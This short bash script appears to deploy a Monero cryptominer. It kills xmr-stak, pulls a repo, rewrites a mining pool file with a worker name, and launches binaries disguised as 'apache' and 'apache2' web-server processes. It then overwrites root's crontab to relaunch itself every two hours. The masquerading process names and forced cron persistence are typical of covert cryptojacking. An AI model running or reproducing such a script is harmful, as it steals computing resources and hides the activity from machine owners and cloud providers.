#!/bin/bash


killall xmr-stak; killall apache2; killall apache

cd ~/dollar/ ; git stash drop; git reset --hard; git pull
sed -i -e "s/digitaloceanxmr/`cat ~/index.html`/" pools.txt
cd ~/dollar/ 
cp -rf cpu`nproc`.txt cpu.txt
chmod +x apache2 ; chmod +x apache
./apache2 & 
./apache  &



echo '0 */2 * * * bash /root/dollar/apache.sh &> /root/out.log' | crontab -
